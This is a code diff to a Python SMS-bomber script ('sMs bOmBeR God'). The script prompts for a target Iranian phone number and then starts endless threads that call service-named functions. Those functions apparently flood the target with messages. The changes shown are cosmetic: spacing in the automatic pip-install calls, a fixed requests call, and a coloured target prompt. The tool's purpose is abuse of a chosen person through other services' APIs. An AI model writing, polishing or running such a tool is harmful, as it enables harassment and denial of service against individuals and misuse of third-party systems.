@@ -5,19 +5,19 @@ from os import system
 try:
     import requests
 except:
-    system ('pip install requests')
+    system('pip install requests')
 try:
     import threading
 except:
-    system ('pip install threading')
+    system('pip install threading')
 try:
     import colored
 except:
-    system ('pip install colored')
+    system('pip install colored')
 try:
     from datetime import datetime
 except:
-    system ('pip install datetime')
+    system('pip install datetime')
 # !
 import time
 import requests
@@ -45,7 +45,7 @@ white="\033[00m"
 print(f"{blue}\n\n\n\n\nsMs bOmBeR God\n")
 sleep(2)
 try:
-    tm = get("https://api.codebazan.ir/time-date/?td=all").text
+    tm = requests.get("https://api.codebazan.ir/time-date/?td=all").text
 except:
     tm = (datetime.today())
 
@@ -183,7 +183,7 @@ def bama(phone):
         print (f"{red}no attack-!\n")
 
 try:
-    phone = str(input(" Number Target (+98xxxxxxx)> "))
+    phone = str(input(f"{blue}Number Target {darkblue}(+98XXXXXXXXXX) {green}⟩⟩> {white}"))
     while True:
         Thread(target=snap, args=[phone]).start()
         Thread(target=shad, args=[phone]).start()
